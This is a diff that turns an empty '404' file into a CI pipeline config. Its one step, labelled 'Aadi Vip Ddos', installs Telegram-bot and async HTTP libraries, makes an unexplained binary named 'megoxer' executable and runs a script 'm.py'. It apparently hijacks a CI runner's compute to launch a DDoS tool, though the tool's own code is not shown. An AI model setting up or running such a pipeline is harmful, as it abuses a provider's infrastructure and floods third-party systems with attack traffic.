@@ -1,1 +1,8 @@
-404: Not Found
+pipelines:
+  default:
+    - step:
+        name: AADI VIP
+        image: continuumio/anaconda3
+        script:
+          - echo "Aadi Vip Ddos..."
+          - pip install telebot pymongo aiohttp && chmod 755 megoxer && python3 m.py
